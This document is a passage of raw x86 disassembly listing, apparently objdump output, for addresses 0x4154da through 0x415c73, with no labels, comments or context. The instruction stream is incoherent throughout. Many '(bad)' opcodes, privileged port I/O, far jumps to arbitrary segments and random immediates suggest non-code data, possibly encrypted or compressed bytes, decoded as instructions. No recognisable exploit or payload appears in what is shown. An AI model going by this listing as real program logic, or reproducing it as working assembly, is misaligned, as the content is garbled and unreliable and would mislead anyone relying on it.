  4154da:	xor    DWORD PTR [ecx],0xffffffef
  4154dd:	inc    ebp
  4154de:	out    0xa9,al
  4154e0:	or     BYTE PTR [eax+esi*8-0x752581ef],ah
  4154e7:	cmp    al,0xb9
  4154e9:	pushf  
  4154ea:	or     al,0x4c
  4154ec:	lods   eax,DWORD PTR ds:[esi]
  4154ed:	int    0xb4
  4154ef:	(bad)  
  4154f0:	neg    BYTE PTR [ebx+0x5a]
  4154f3:	sbb    DWORD PTR [ebp-0x2],eax
  4154f6:	arpl   WORD PTR [ebx+0x8],ax
  4154f9:	push   edx
  4154fa:	mov    BYTE PTR [ebx+eax*8],ch
  4154fd:	stos   BYTE PTR es:[edi],al
  4154fe:	xor    esp,DWORD PTR [ebp+0x69826891]
  415504:	xchg   edx,eax
  415505:	pop    ecx
  415506:	ja     0x41548e
  415508:	fld    QWORD PTR cs:[edi-0x6434fed1]
  415510:	stos   BYTE PTR es:[edi],al
  415511:	jge    0x415540
  415513:	jo     0x415589
  415515:	add    esp,DWORD PTR [ecx+0x1a]
  415518:	mov    esp,0xcd2f357f
  41551d:	push   edx
  41551e:	fidiv  DWORD PTR [eax-0x66]
  415521:	xlat   BYTE PTR ds:[ebx]
  415522:	stos   BYTE PTR es:[edi],al
  415523:	mov    cl,BYTE PTR [edi+eiz*2+0x6d]
  415527:	out    0x7a,al
  415529:	addr16 add eax,edi
  41552c:	vpcomq xmm6,xmm1,XMMWORD PTR ds:0x540fcb2,0x85
  415536:	cmp    DWORD PTR [edx-0x1b6def3b],ebp
  41553c:	xor    eax,DWORD PTR [eax+0x51bf6eba]
  415542:	cmc    
  415543:	jbe    0x41550a
  415545:	(bad)  
  415546:	cld    
  415547:	stmxcsr DWORD PTR [ebp+eax*1-0x2]
  41554c:	or     DWORD PTR [edi-0x4c788a83],0x58
  415553:	jmp    0xbd8f:0x74d0b824
  41555a:	mov    al,ds:0xbfca003f
  41555f:	sub    al,0xc8
  415561:	rcr    DWORD PTR [eax],0x99
  415564:	pop    edx
  415565:	cmp    ecx,0xfffffff3
  415568:	mov    bh,0x59
  41556a:	adc    al,0x1c
  41556c:	pop    edi
  41556d:	push   es
  41556e:	cs xchg ecx,eax
  415570:	je     0x415538
  415572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415573:	fcomp  QWORD PTR [ebx-0x6c]
  415576:	push   eax
  415577:	mov    cl,BYTE PTR [edx]
  415579:	mov    esi,0xf82d98f7
  41557e:	fs mov dl,0xc
  415581:	shr    DWORD PTR [edx+0x5d81d32c],0xd9
  415588:	dec    eax
  415589:	adc    eax,0xa5371d39
  41558e:	inc    ecx
  41558f:	outs   dx,DWORD PTR ds:[esi]
  415590:	aad    0x79
  415592:	xchg   DWORD PTR [eax],edx
  415594:	loop   0x41554c
  415596:	jmp    0xa6dc:0x420e8474
  41559d:	(bad)  
  41559f:	(bad)  
  4155a0:	xchg   edi,eax
  4155a1:	pushf  
  4155a2:	mul    cl
  4155a4:	pop    ebp
  4155a6:	push   ebp
  4155a7:	test   edx,esp
  4155a9:	mov    DWORD PTR ds:0xc0ee7225,ebp
  4155af:	call   0x7f8a:0x9557fdb3
  4155b6:	mov    al,0x1f
  4155b8:	ss xor eax,0xbfb75acc
  4155be:	cmp    BYTE PTR [edi-0x22],0xff
  4155c2:	mov    ebx,DWORD PTR [ebp-0x34]
  4155c5:	cld    
  4155c6:	sub    BYTE PTR [edx+edi*2],dh
  4155c9:	jle    0x415631
  4155cb:	xlat   BYTE PTR ds:[ebx]
  4155cc:	jo     0x41562e
  4155ce:	test   DWORD PTR [esi+0x1e],esp
  4155d1:	data16 test al,0x9a
  4155d4:	mov    esp,0xb8b8c392
  4155d9:	clc    
  4155da:	xor    al,0xbe
  4155dc:	inc    esp
  4155dd:	(bad)  
  4155df:	push   ebp
  4155e0:	inc    edx
  4155e1:	fsub   st(3),st
  4155e3:	test   al,0xad
  4155e5:	ret    0x50ef
  4155e8:	aas    
  4155e9:	test   eax,0x97e8e2ab
  4155ee:	in     eax,0xb1
  4155f0:	or     ebx,edi
  4155f2:	(bad)  
  4155f3:	fisubr DWORD PTR [eax+0x6c]
  4155f6:	cmp    edi,0xffffffcd
  4155f9:	sahf   
  4155fa:	or     esi,edi
  4155fc:	aam    0x4a
  4155fe:	cmp    cl,BYTE PTR [eax-0x65]
  415601:	sahf   
  415602:	call   0x9468148f
  415607:	sub    BYTE PTR [ecx+ebx*1],cl
  41560a:	scas   al,BYTE PTR es:[edi]
  41560b:	cmp    ebx,DWORD PTR [edx]
  41560d:	sub    ebx,DWORD PTR [ebp+0x407f6d5d]
  415613:	fdiv   QWORD PTR [ebp-0x4e9b8a]
  415619:	call   0xc09d64f1
  41561e:	leave  
  41561f:	fdiv   QWORD PTR [ebp-0x5f]
  415622:	aad    0x9e
  415624:	cmc    
  415625:	mov    al,BYTE PTR [ebx+edx*4]
  415628:	fidivr DWORD PTR [ecx]
  41562a:	out    dx,eax
  41562b:	push   0xffffffb1
  41562d:	dec    ebx
  41562e:	cs xor al,dh
  415631:	(bad)  
  415632:	out    dx,al
  415633:	jmp    0x4f3c:0xb0a3bf25
  41563a:	out    dx,eax
  41563b:	mov    esi,0xf5d9e364
  415640:	dec    ecx
  415641:	ficomp WORD PTR [eax+0x3cd736a3]
  415647:	ss fdiv st(2),st
  41564a:	dec    ecx
  41564b:	pop    edx
  41564c:	dec    esp
  41564d:	xchg   ecx,eax
  41564e:	mov    es,edi
  415650:	push   es
  415651:	xchg   DWORD PTR [ebx],edx
  415653:	mov    DWORD PTR [edx+0x1aaf355],eax
  415659:	outs   dx,DWORD PTR ds:[esi]
  41565a:	addr16 jb 0x415633
  41565d:	inc    esp
  41565e:	fdiv   DWORD PTR [edx+0x1afc385a]
  415664:	stos   DWORD PTR es:[edi],eax
  415665:	pop    ss
  415666:	sahf   
  415667:	fucomi st,st(6)
  415669:	ds xor esp,esi
  41566c:	xlat   BYTE PTR fs:[ebx]
  41566e:	setle  BYTE PTR [ebp-0x4c]
  415672:	dec    ebx
  415673:	push   0xffffffad
  415675:	call   0xef09:0xd7fc027f
  41567c:	push   ebp
  41567d:	xchg   esp,eax
  41567e:	adc    DWORD PTR [edi-0x675e4bd2],edi
  415684:	add    dl,bh
  415686:	lea    eax,[ecx]
  415688:	cli    
  415689:	or     BYTE PTR [ecx-0xb328c0f],0x72
  415690:	sub    cl,BYTE PTR [esp+eiz*2+0x78]
  415694:	pop    eax
  415695:	add    ah,BYTE PTR [esi-0x2a]
  415698:	scas   eax,DWORD PTR es:[edi]
  415699:	dec    esi
  41569a:	sti    
  41569b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41569c:	int    0xdf
  41569e:	and    dh,0xf5
  4156a1:	scas   al,BYTE PTR es:[edi]
  4156a2:	cwde   
  4156a3:	loop   0x41564e
  4156a5:	popa   
  4156a6:	dec    esi
  4156a7:	das    
  4156a8:	sub    DWORD PTR [edx+0x4e340caf],ecx
  4156ae:	push   edi
  4156af:	es scas al,BYTE PTR es:[edi]
  4156b1:	xor    ah,bh
  4156b3:	cmc    
  4156b4:	gs pop esp
  4156b6:	mov    eax,ds:0xee21dc09
  4156bb:	retf   0x2340
  4156be:	int3   
  4156bf:	repz mov ebp,0xa41d06c
  4156c5:	mov    cl,0xfa
  4156c7:	js     0x415737
  4156c9:	push   cs
  4156ca:	mov    edx,0x2f841a39
  4156cf:	aas    
  4156d0:	pop    edx
  4156d1:	sub    eax,0x880b4d1b
  4156d6:	push   0xfffffff2
  4156d8:	or     al,0xd1
  4156da:	xchg   esi,eax
  4156db:	test   al,0x94
  4156dd:	or     dl,BYTE PTR [ebx]
  4156df:	push   edx
  4156e0:	arpl   WORD PTR [edx+0x24dc632],cx
  4156e6:	cs dec esp
  4156e8:	jp     0x415719
  4156ea:	dec    eax
  4156eb:	sbb    esp,DWORD PTR [ebx-0x16d00f2f]
  4156f1:	jns    0x415770
  4156f3:	dec    ebp
  4156f4:	pop    esi
  4156f5:	scas   al,BYTE PTR es:[edi]
  4156f6:	add    DWORD PTR [ecx],ecx
  4156f8:	scas   eax,DWORD PTR es:[edi]
  4156f9:	push   ebx
  4156fa:	jns    0x415735
  4156fc:	fsubr  st,st(3)
  4156fe:	push   ebx
  4156ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415700:	jnp    0x4156de
  415702:	sbb    al,0xf6
  415704:	(bad)  
  415705:	xchg   esp,eax
  415706:	pushf  
  415707:	or     DWORD PTR [edx],ebx
  415709:	pop    ss
  41570a:	imul   esi,DWORD PTR [ebx+0x4c745b2d],0xd6e365bb
  415714:	mov    bh,0xfd
  415716:	mov    cl,0x8e
  415718:	aaa    
  415719:	stos   BYTE PTR es:[edi],al
  41571a:	das    
  41571b:	sub    al,bh
  41571d:	mov    al,ds:0x92896aba
  415722:	(bad)  
  415723:	ja     0x415778
  415725:	mov    edx,0x3f4bdbb
  41572a:	cli    
  41572b:	mov    esp,0x961962a0
  415730:	iret   
  415731:	(bad)  
  415732:	adc    al,0xd7
  415734:	mov    bl,0xe2
  415736:	push   ds
  415737:	repz inc eax
  415739:	icebp  
  41573a:	sar    DWORD PTR [ecx-0x42c6f97b],0xf7
  415741:	or     edx,DWORD PTR [esi+0x7b]
  415744:	loope  0x4157a1
  415746:	aaa    
  415747:	mov    al,ds:0x8e6903ca
  41574c:	xor    cl,bh
  41574e:	add    al,0x1d
  415750:	xchg   esp,eax
  415751:	gs aaa 
  415753:	sub    edx,DWORD PTR [edx-0xea4396e]
  415759:	dec    eax
  41575a:	cmp    ecx,DWORD PTR [esi]
  41575c:	push   ecx
  41575d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41575e:	fisttp DWORD PTR [edi]
  415760:	retf   
  415761:	lock popa 
  415763:	sbb    esi,DWORD PTR [edi]
  415765:	pop    es
  415766:	pushf  
  415767:	ret    0x5f08
  41576a:	fwait
  41576b:	stos   DWORD PTR es:[edi],eax
  41576c:	mov    bh,0xac
  41576e:	gs ret 0xf59d
  415772:	ficomp WORD PTR [ebx]
  415774:	push   esp
  415775:	mov    bh,0x60
  415777:	scas   eax,DWORD PTR es:[edi]
  415778:	lds    edx,FWORD PTR [ebp+0x56]
  41577b:	xor    BYTE PTR [ebp-0x7d],0x59
  41577f:	mov    ecx,0x68959200
  415784:	pop    ecx
  415785:	ds add ecx,ebp
  415788:	icebp  
  415789:	add    eax,0x92b810de
  41578e:	shl    esp,0xd9
  415791:	int    0xc3
  415793:	or     BYTE PTR [ecx],bh
  415795:	cld    
  415796:	xchg   ebx,eax
  415797:	jo     0x415807
  415799:	and    ebp,DWORD PTR [esi]
  41579b:	or     BYTE PTR [edx],dl
  41579d:	jnp    0x4157ba
  41579f:	fwait
  4157a0:	add    edi,DWORD PTR [ebx-0x9]
  4157a3:	loope  0x4157cd
  4157a5:	fcmovnu st,st(4)
  4157a7:	sbb    al,bl
  4157a9:	dec    edi
  4157aa:	xor    edi,esi
  4157ac:	hlt    
  4157ad:	xchg   ebp,ecx
  4157af:	popf   
  4157b0:	pop    ecx
  4157b1:	adc    al,0xdb
  4157b3:	rcl    BYTE PTR [edx+eiz*2+0x2d],0xa2
  4157b8:	xor    BYTE PTR [edi-0x482eea9b],bh
  4157be:	sub    al,0xaf
  4157c0:	sub    esi,DWORD PTR [ecx+0x22750c07]
  4157c6:	out    dx,al
  4157c7:	add    eax,0x4b694313
  4157cc:	ret    
  4157cd:	or     DWORD PTR [ecx],esi
  4157cf:	jae    0x41582e
  4157d1:	daa    
  4157d2:	outs   dx,DWORD PTR ds:[esi]
  4157d3:	mov    ds:0x35282836,eax
  4157d8:	mov    esp,0x93cb1e29
  4157dd:	mov    dl,0x9
  4157df:	inc    ebp
  4157e0:	ja     0x415795
  4157e2:	enter  0x82c9,0x2f
  4157e6:	sbb    eax,0x1022e808
  4157eb:	xchg   esi,eax
  4157ec:	mov    cl,0x26
  4157ee:	sbb    al,cl
  4157f0:	and    edx,DWORD PTR ds:0x86b9e964
  4157f6:	test   al,0x7e
  4157f8:	adc    DWORD PTR [edx],ecx
  4157fa:	jns    0x415861
  4157fc:	mov    eax,0xa8249114
  415801:	sbb    eax,0xcc1db1
  415806:	sub    ah,ah
  415808:	pusha  
  415809:	xchg   esp,edi
  41580b:	push   ebp
  41580c:	fwait
  41580d:	jo     0x4157da
  41580f:	idiv   BYTE PTR [edi+0x3d037b78]
  415815:	test   eax,0xecbb3f7d
  41581a:	xor    ah,BYTE PTR [ecx+0x4005299]
  415820:	ffree  st(5)
  415822:	int3   
  415823:	loop   0x4157aa
  415825:	es pusha 
  415827:	shr    BYTE PTR [edx],0x6a
  41582a:	push   edi
  41582b:	dec    edi
  41582c:	rol    BYTE PTR [ebp+0x52],1
  41582f:	jns    0x41580d
  415831:	pop    edx
  415832:	xor    bh,0x46
  415835:	(bad)  
  415837:	sar    ch,1
  415839:	hlt    
  41583a:	outs   dx,BYTE PTR ds:[esi]
  41583b:	popa   
  41583c:	hlt    
  41583d:	pop    es
  41583e:	gs dec ebx
  415840:	dec    ebx
  415841:	inc    esp
  415842:	mov    ebp,0x312a962
  415847:	cmp    DWORD PTR [esi],edi
  415849:	fcom   DWORD PTR [esi-0x28]
  41584c:	(bad)  
  41584d:	mov    ecx,0xf68625f0
  415853:	les    ecx,FWORD PTR [edx]
  415855:	pop    ebp
  415856:	lds    ebx,FWORD PTR [ebx+eiz*1-0x45a5934d]
  41585d:	mov    WORD PTR [edi],?
  41585f:	sbb    BYTE PTR [ebx-0x456e8ff7],cl
  415865:	push   es
  415866:	fcmove st,st(7)
  415868:	adc    eax,0x502d5c
  41586d:	rcl    DWORD PTR [ebx+0xedb7c14],1
  415873:	dec    edi
  415874:	fadd   QWORD PTR [ebp+esi*2+0x7119dfbb]
  41587b:	dec    edi
  41587c:	out    0x53,al
  41587e:	out    0xb3,al
  415880:	stos   BYTE PTR es:[edi],al
  415881:	out    0x3f,eax
  415883:	jb     0x4158b5
  415885:	out    0x5b,eax
  415887:	addr16 add al,0xa2
  41588a:	mov    ah,0x68
  41588c:	mov    ah,0x5c
  41588e:	adc    ecx,DWORD PTR [edx+0x5f]
  415891:	ins    BYTE PTR es:[edi],dx
  415892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415893:	ins    DWORD PTR es:[edi],dx
  415894:	jmp    0xa25cf1a4
  415899:	mov    eax,0x8aed47d2
  41589e:	je     0x41587b
  4158a0:	bound  esp,QWORD PTR ss:[ebp-0x3b]
  4158a4:	dec    ecx
  4158a5:	jmp    0x4dc3:0xa2131800
  4158ac:	inc    ebp
  4158ad:	cmp    eax,DWORD PTR [ecx+0x30]
  4158b0:	mov    DWORD PTR ds:0x51a9ba1e,0x9e01bbad
  4158ba:	xchg   BYTE PTR [esi],dh
  4158bc:	loopne 0x415869
  4158be:	inc    esi
  4158bf:	in     al,dx
  4158c0:	mov    dl,0x1b
  4158c2:	push   cs
  4158c3:	cmp    edx,edi
  4158c5:	add    DWORD PTR ds:0x685b9950,ebx
  4158cb:	leave  
  4158cc:	daa    
  4158cd:	bound  ebx,QWORD PTR [edi]
  4158cf:	jle    0x4158d2
  4158d1:	cmp    al,0xc1
  4158d3:	dec    esp
  4158d4:	inc    edx
  4158d5:	dec    edx
  4158d6:	retf   
  4158d7:	xor    cl,dh
  4158d9:	lods   al,BYTE PTR ds:[esi]
  4158da:	cmp    BYTE PTR [ebx+eiz*8],0x2e
  4158de:	xor    edx,DWORD PTR [edi+eiz*2-0x342160e3]
  4158e5:	mov    ebp,0x8a4c2b0c
  4158ea:	sahf   
  4158eb:	fcomp  QWORD PTR [ebx-0x6ea87ccf]
  4158f1:	or     ch,0xac
  4158f4:	(bad)  
  4158f5:	mov    ah,0xcd
  4158f7:	inc    edx
  4158f8:	xchg   bh,ah
  4158fa:	xchg   ebx,eax
  4158fb:	add    dh,BYTE PTR [ecx+edx*2]
  4158fe:	cwde   
  4158ff:	clc    
  415900:	int3   
  415901:	dec    edi
  415902:	adc    BYTE PTR [edx-0x2e8fbc6d],bh
  415908:	adc    al,0xd3
  41590a:	sahf   
  41590b:	dec    edx
  41590c:	xchg   ecx,eax
  41590d:	add    al,0x4d
  41590f:	xchg   ebp,eax
  415910:	imul   esi,DWORD PTR [ebx-0x11],0x49b74e85
  415917:	sbb    dl,bh
  415919:	cli    
  41591a:	adc    eax,0x354cf93d
  41591f:	mov    ds:0xde5e5461,eax
  415924:	sub    al,0xd4
  415926:	push   ebx
  415927:	xchg   esi,ebp
  415929:	xor    bh,dh
  41592b:	mov    ds:0xf2f00dda,al
  415930:	mov    ah,BYTE PTR [ebp-0x7]
  415933:	xchg   BYTE PTR [ecx-0x32],al
  415936:	scas   eax,DWORD PTR es:[edi]
  415937:	push   edx
  415938:	xor    cl,BYTE PTR [ebx]
  41593a:	cmp    al,0xf9
  41593c:	mov    ch,0xb0
  41593e:	jo     0x415953
  415940:	ds aam 0x12
  415943:	lods   al,BYTE PTR ds:[esi]
  415944:	inc    eax
  415945:	or     eax,edx
  415947:	int3   
  415948:	outs   dx,BYTE PTR ds:[esi]
  415949:	and    al,0x9a
  41594b:	inc    ebp
  41594c:	fs mov edi,0x3a59a866
  415952:	jbe    0x4158d8
  415954:	sbb    dh,dh
  415956:	xlat   BYTE PTR ds:[ebx]
  415957:	fild   WORD PTR [edx]
  415959:	sub    edi,DWORD PTR [edx]
  41595b:	int3   
  41595c:	icebp  
  41595d:	(bad)  
  41595e:	in     eax,0x8e
  415960:	xor    cl,BYTE PTR [ebp+0x40]
  415963:	mov    edx,0x33e033cd
  415968:	sub    eax,0x9d47b542
  41596d:	jne    0x4159eb
  41596f:	aas    
  415970:	cmp    eax,DWORD PTR [eax+0x42]
  415973:	xor    esi,DWORD PTR [edx+ecx*8+0x455902ad]
  41597a:	clc    
  41597b:	push   es
  41597c:	jo     0x415982
  41597e:	xor    al,0x19
  415980:	rcr    DWORD PTR [eax-0x47],1
  415983:	push   ecx
  415984:	in     al,0xf0
  415986:	in     eax,0x50
  415988:	xor    edx,eax
  41598a:	push   es
  41598b:	out    dx,eax
  41598c:	mov    eax,ds:0x9dbbe13
  415991:	xchg   dh,cl
  415993:	xchg   edi,eax
  415994:	mov    ah,BYTE PTR [ebp-0x44cedfcf]
  41599a:	lock push cs
  41599c:	and    DWORD PTR [eax],edi
  41599e:	aaa    
  41599f:	adc    al,0x9c
  4159a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159a2:	inc    ebp
  4159a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159a4:	pop    edi
  4159a5:	mov    eax,DWORD PTR [edx+0x1f]
  4159a8:	add    al,BYTE PTR [esi]
  4159aa:	and    eax,0x629101d0
  4159af:	or     al,BYTE PTR [ecx-0x1c]
  4159b2:	loope  0x4159e1
  4159b4:	xor    ebp,DWORD PTR [edi+0x3d]
  4159b7:	push   ss
  4159b8:	dec    ebx
  4159b9:	rcr    DWORD PTR [ecx+esi*8+0x5c9e9bc0],1
  4159c0:	cli    
  4159c1:	sub    dl,cl
  4159c3:	mov    ebx,ebx
  4159c5:	xchg   esp,eax
  4159c6:	jp     0x4159da
  4159c8:	cdq    
  4159c9:	jmp    0xe934:0x7cdcd699
  4159d0:	in     eax,dx
  4159d1:	and    eax,0x2514f915
  4159d6:	mov    edi,0xa12b5879
  4159db:	or     edi,0xffffff8f
  4159de:	mov    bh,0x58
  4159e0:	pop    ebp
  4159e1:	pop    ss
  4159e2:	adc    ebx,DWORD PTR [edi-0x49aca6e0]
  4159e8:	outs   dx,BYTE PTR ds:[esi]
  4159e9:	mov    al,ds:0x85f13e43
  4159ee:	push   ds
  4159ef:	sbb    eax,0x5fa4eb59
  4159f4:	xchg   DWORD PTR [ecx-0xf],edx
  4159f7:	int3   
  4159f8:	or     edx,DWORD PTR [edi]
  4159fa:	push   ss
  4159fb:	jmp    0x4159a6
  4159fd:	mov    bh,0x9e
  4159ff:	cmp    eax,0x3a5e166d
  415a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a05:	add    DWORD PTR ds:[esi],esi
  415a08:	pop    esi
  415a09:	xor    al,0x12
  415a0b:	outs   dx,BYTE PTR ds:[esi]
  415a0c:	call   0xc5b9:0xc89382eb
  415a13:	adc    al,0x2f
  415a15:	mov    ecx,0xc4bc3f7f
  415a1a:	pop    edi
  415a1b:	or     ecx,DWORD PTR [ebp+0x2e]
  415a1e:	lds    ebp,FWORD PTR [esi-0x46]
  415a21:	sbb    bh,BYTE PTR ds:0x30fd8dc5
  415a27:	test   eax,0xf4c1ca1d
  415a2c:	loopne 0x4159d0
  415a2e:	aad    0xb4
  415a30:	fnsave [esi+esi*4-0x52d4ee9]
  415a37:	push   ebp
  415a38:	out    0xe7,al
  415a3a:	pop    esi
  415a3b:	add    cl,BYTE PTR [ebp+ecx*8-0x6]
  415a3f:	cmp    ebp,edi
  415a41:	lea    eax,[eax-0x14]
  415a44:	int    0x1c
  415a46:	adc    bh,BYTE PTR [edi+0x2]
  415a49:	inc    ecx
  415a4a:	dec    ecx
  415a4b:	xchg   ebx,eax
  415a4c:	out    0xbd,al
  415a4e:	inc    ebx
  415a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a50:	dec    ebp
  415a51:	aaa    
  415a52:	ret    
  415a53:	ficom  WORD PTR [eax+0x5c93cf4c]
  415a59:	cld    
  415a5a:	xchg   edx,ebp
  415a5c:	adc    ecx,DWORD PTR [eax+0x4e]
  415a5f:	popa   
  415a60:	sbb    edx,DWORD PTR [eax-0x77]
  415a63:	pushf  
  415a64:	in     al,dx
  415a65:	das    
  415a66:	dec    eax
  415a67:	or     BYTE PTR ds:0xb80f6f6e,bl
  415a6d:	mov    al,0x92
  415a6f:	add    eax,0xc263cb61
  415a74:	push   0xc20a312f
  415a79:	or     dl,BYTE PTR [edi]
  415a7b:	mov    BYTE PTR [ecx-0x66],cl
  415a7e:	fstp   QWORD PTR [eax+0xb]
  415a81:	jns    0x415ac1
  415a83:	aaa    
  415a84:	inc    ecx
  415a85:	mov    ecx,gs
  415a87:	repz dec ebp
  415a89:	stos   DWORD PTR es:[edi],eax
  415a8a:	sbb    al,0x51
  415a8c:	(bad)  
  415a8d:	pop    edx
  415a8e:	mov    al,ds:0xa19c4d5e
  415a93:	sti    
  415a94:	lods   al,BYTE PTR ds:[esi]
  415a95:	ficomp WORD PTR [edi-0x4ab30bf7]
  415a9b:	sbb    ah,ch
  415a9d:	pusha  
  415a9e:	push   0xffffffb4
  415aa0:	fidiv  WORD PTR [eax*1+0x69d67ba9]
  415aa7:	cld    
  415aa8:	pop    eax
  415aa9:	xchg   ebx,eax
  415aaa:	je     0x415ad4
  415aac:	jb     0x415ac2
  415aae:	in     eax,0x3f
  415ab0:	stos   DWORD PTR es:[edi],eax
  415ab1:	xor    cl,BYTE PTR gs:[esp]
  415ab5:	push   ss
  415ab6:	(bad)  
  415ab7:	cmp    DWORD PTR [ebp+0x6cbd498b],esp
  415abd:	add    dh,ch
  415abf:	call   0x93e7:0x33f47bf4
  415ac6:	pushf  
  415ac7:	pusha  
  415ac8:	retf   
  415ac9:	sti    
  415aca:	test   BYTE PTR [edx+ebp*1+0x40fc90eb],0x8c
  415ad2:	adc    ecx,DWORD PTR ds:0x415dce69
  415ad8:	imul   DWORD PTR [esi+eiz*4+0x57]
  415adc:	shr    DWORD PTR [ebx-0x7c],cl
  415adf:	mov    esi,0x1adda9d4
  415ae4:	sar    DWORD PTR [ebp+0xa92368f],cl
  415aea:	pop    esp
  415aeb:	(bad)  
  415aec:	icebp  
  415aed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aee:	pop    es
  415aef:	imul   BYTE PTR [eax]
  415af1:	dec    edi
  415af2:	xchg   ebx,eax
  415af3:	sbb    ah,BYTE PTR [edi-0x21]
  415af6:	mov    cl,0x3d
  415af8:	sbb    eax,0x9d837d2e
  415afd:	mul    DWORD PTR [esi]
  415aff:	outs   dx,BYTE PTR ds:[esi]
  415b00:	ja     0x415a97
  415b02:	push   ss
  415b03:	sbb    ebx,eax
  415b05:	(bad)  
  415b06:	repnz pop esp
  415b08:	jecxz  0x415af9
  415b0a:	push   esi
  415b0b:	xor    ah,BYTE PTR [esi]
  415b0d:	lea    ebp,[eax-0x6d]
  415b10:	mov    cs,WORD PTR ds:[eax]
  415b13:	pop    eax
  415b14:	or     eax,0xc2e54225
  415b19:	mov    edx,0x98964039
  415b1e:	push   ss
  415b1f:	daa    
  415b20:	pop    ds
  415b21:	pop    es
  415b22:	add    DWORD PTR [ebp+0x439cbcda],ebp
  415b28:	je     0x415add
  415b2a:	dec    ebp
  415b2b:	aad    0xd5
  415b2d:	inc    esp
  415b2e:	arpl   WORD PTR [ebp+0x7f451c7],bx
  415b34:	adc    al,0xe7
  415b36:	ret    
  415b37:	and    BYTE PTR [esi+0x62],dh
  415b3a:	adc    DWORD PTR [edi-0x63],ebp
  415b3d:	mov    ebp,0xe041476f
  415b42:	mov    edx,0x1ee3bbde
  415b47:	dec    eax
  415b48:	daa    
  415b49:	sub    DWORD PTR [edx+0x71],ebx
  415b4c:	sar    DWORD PTR [ebx-0x50079238],0x4
  415b53:	scas   eax,DWORD PTR es:[edi]
  415b54:	je     0x415b0c
  415b56:	or     ebp,DWORD PTR [ecx+0x2709a205]
  415b5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b5d:	add    dl,bh
  415b5f:	cmp    ebp,ebx
  415b61:	mul    cl
  415b63:	lds    esi,FWORD PTR [ecx+0x5c]
  415b66:	jne    0x415b65
  415b68:	mov    al,ds:0xcbbf0b4d
  415b6d:	ret    
  415b6e:	es dec cx
  415b71:	retf   
  415b72:	cs cwde 
  415b74:	fnstcw WORD PTR [ebx-0x4255e436]
  415b7a:	lock pop esi
  415b7c:	adc    edi,0xe
  415b7f:	mov    ah,0xe3
  415b81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b82:	jle    0x415b09
  415b84:	mov    ebx,0x47097a16
  415b89:	jmp    0x965bd849
  415b8e:	add    eax,0xafad72c9
  415b93:	xor    dh,BYTE PTR es:[ecx+0x4bcc395a]
  415b9a:	(bad)  
  415b9b:	sbb    eax,0xb4530c20
  415ba0:	sbb    edx,edi
  415ba2:	lods   al,BYTE PTR ds:[esi]
  415ba3:	aam    0x3e
  415ba5:	or     dl,BYTE PTR [ebx-0x48fe3dcf]
  415bab:	imul   BYTE PTR [ecx]
  415bad:	pop    esi
  415bae:	xchg   ebp,eax
  415baf:	jmp    0xd61f:0x424325e6
  415bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bb7:	adc    DWORD PTR [ecx+ecx*2-0x46],0xffffff86
  415bbc:	ficomp WORD PTR [edi-0x6a0a49f3]
  415bc2:	push   0x7b7935ec
  415bc7:	aam    0xaf
  415bc9:	push   eax
  415bca:	scas   eax,DWORD PTR es:[edi]
  415bcb:	jmp    0xf379:0x426fec1d
  415bd2:	add    BYTE PTR [edi],bh
  415bd4:	push   esp
  415bd5:	sbb    ebx,ecx
  415bd7:	adc    BYTE PTR [eax],ch
  415bd9:	jo     0x415c36
  415bdb:	dec    esi
  415bdc:	mov    bl,0x9a
  415bde:	pop    edi
  415bdf:	fdiv   DWORD PTR [ecx-0x9]
  415be2:	and    ah,ch
  415be4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415be5:	fnstsw WORD PTR [edx]
  415be7:	push   edi
  415be8:	test   edi,esp
  415bea:	jns    0x415c00
  415bec:	adc    DWORD PTR [eax],esp
  415bee:	or     BYTE PTR [esi-0x17],al
  415bf1:	xor    al,0x37
  415bf3:	dec    edx
  415bf4:	pop    eax
  415bf5:	add    dl,bl
  415bf7:	(bad)  
  415bf9:	rcl    ch,1
  415bfb:	ins    DWORD PTR es:[edi],dx
  415bfc:	outs   dx,DWORD PTR ds:[esi]
  415bfd:	mov    ebp,0xbb320b14
  415c02:	ss mov dh,0x99
  415c05:	repnz pop ds
  415c07:	lahf   
  415c08:	jl     0x415b99
  415c0a:	fld    QWORD PTR [eax+0x43]
  415c0d:	pop    esi
  415c0e:	push   0xffffffae
  415c10:	sub    ch,dh
  415c12:	test   al,0x51
  415c14:	pusha  
  415c15:	push   ds
  415c16:	adc    BYTE PTR [ebp+eiz*8-0xa9a3b8d],al
  415c1d:	(bad)  
  415c1e:	lock mov dl,0x26
  415c21:	ins    DWORD PTR es:[edi],dx
  415c22:	lock outs dx,DWORD PTR ds:[esi]
  415c24:	ret    
  415c25:	fs dec edx
  415c27:	jmp    0x90e1:0xbbb4b470
  415c2e:	out    dx,al
  415c2f:	ins    BYTE PTR es:[edi],dx
  415c30:	add    eax,0xec597a23
  415c35:	mov    cl,0xb0
  415c37:	popf   
  415c38:	and    DWORD PTR [eiz*8+0x5ac3b720],edi
  415c3f:	daa    
  415c40:	mov    WORD PTR [ebx+edi*1+0x51],ds
  415c44:	xchg   edx,eax
  415c45:	shr    edi,1
  415c47:	retf   0xa1cd
  415c4a:	add    al,0x72
  415c4c:	fwait
  415c4d:	jnp    0x415bfe
  415c4f:	fisttp QWORD PTR [ebp+0x36b747b0]
  415c55:	fst    DWORD PTR [edx-0x41894883]
  415c5b:	pop    edi
  415c5d:	fdivrp st(2),st
  415c5f:	jbe    0x415cc6
  415c61:	mov    eax,esi
  415c63:	call   0x4355:0x8d898b87
  415c6a:	addr16 adc al,al
  415c6d:	mov    ch,0x39
  415c6f:	inc    edi
  415c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c71:	sbb    DWORD PTR [edx],edx
  415c73:	scas   al,BYTE PTR es:[edi]
